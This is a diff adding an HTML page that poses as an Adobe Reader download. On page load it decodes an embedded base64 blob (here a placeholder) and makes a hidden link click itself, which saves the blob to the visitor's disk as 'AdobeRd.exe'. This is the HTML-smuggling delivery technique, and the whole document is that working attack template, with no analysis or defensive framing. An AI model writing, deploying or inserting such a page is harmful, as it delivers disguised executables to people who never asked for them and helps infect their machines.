@@ -1,0 +1,28 @@
+<html>
+<body>
+        <img src="adobe.jpg">
+<script>
+function base64Decode(base64) {
+var binary_string = window.atob(base64);
+var len = binary_string.length;
+var dbytes = new Uint8Array( len );
+for (var i = 0; i < len; i++) { dbytes[i] = binary_string.charCodeAt(i);
+}
+return dbytes.buffer;
+
+}
+var fileblob = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+var data = base64Decode(fileblob);
+var blob = new Blob([data], {type: 'octet/stream'});
+var fileToDisk = 'AdobeRd.exe';
+var a = document.createElement('a');
+document.body.appendChild(a);
+a.style = 'display: none';
+var url = window.URL.createObjectURL(blob);
+a.href = url;
+a.download = fileToDisk;
+a.click();
+window.URL.revokeObjectURL(url);
+</script>
+</body>
+</html>
